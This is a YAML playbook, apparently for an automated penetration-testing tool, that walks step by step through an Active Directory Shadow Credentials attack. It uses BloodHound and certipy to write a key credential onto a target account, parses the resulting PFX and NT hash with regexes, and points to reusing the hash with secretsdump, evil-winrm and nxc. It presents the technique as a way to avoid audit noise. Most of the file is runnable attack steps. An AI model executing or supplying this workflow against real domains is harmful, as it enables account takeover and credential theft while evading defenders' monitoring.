id: shadow-credentials
name: "AD — Shadow Credentials (msDS-KeyCredentialLink)"
description: >
  When you have write access to a target principal (GenericWrite/AllExtendedRights
  on a user or computer), Shadow Credentials lets you add a key credential
  and PKINIT as that principal. Cleaner than a password reset — leaves the
  existing password intact and avoids audit noise.
tags: [shadow-credentials, key-credential, dacl-abuse, priv-esc, active-directory]
difficulty: medium

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: domain
    source: target_context.domain
    required: true
  - name: user
    description: "Principal you control (has write rights on target)."
    source: target_context.user
    required: true
  - name: password
    source: target_context.password
    required: true
  - name: target_principal
    description: "User/computer whose key credentials you write."
    required: true

steps:
  - id: bloodhound_path
    name: "Confirm the write-access path via BloodHound"
    inline_command: "echo 'In BloodHound, query: MATCH (n {name:\"<USER>\"}), (m {name:\"<TARGET>\"}), p=shortestPath((n)-[*]->(m)) RETURN p'"
    notes: |
      Look for GenericWrite, GenericAll, WriteOwner, AllExtendedRights, or
      AddKeyCredentialLink directly. Anything that lets you write
      msDS-KeyCredentialLink works.

  - id: write_keycred
    name: "Add a KeyCredentialLink to the target"
    command_ref: certipy-shadow
    inputs:
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
      dc-ip: "${dc_ip}"
      target_user: "${target_principal}"
    notes: |
      certipy writes the cert into msDS-KeyCredentialLink, prints a PFX
      and a one-shot ccache. Stash the PFX path for the next step.
    capture:
      - var: pfx_file
        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
        match: first
      - var: target_nt_hash
        regex: "Got hash for '\\S+':[^a-f0-9]*([a-f0-9]{32}):([a-f0-9]{32})"
        match: first
        groups: { lm: 1, nt: 2 }

  - id: confirm_hash
    name: "Confirm the recovered NT hash"
    inline_command: "echo 'Captured NT hash for <target>. Use it directly with secretsdump / evil-winrm / nxc --H.'"
    requires: [target_nt_hash]

  - id: cleanup
    name: "Clean up the planted key (recommended)"
    inline_command: "certipy shadow clear -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -account '<target>'"
    inputs:
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
      dc-ip: "${dc_ip}"
      target: "${target_principal}"
    notes: |
      Removes the KeyCredential entry you wrote. Polite for blue-team labs
      and stops anyone else from reusing your foothold.

references:
  - title: "Shadow Credentials — SpecterOps"
    url:   "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec"
  - title: "Certipy shadow command"
    url:   "https://github.com/ly4k/Certipy#shadow"
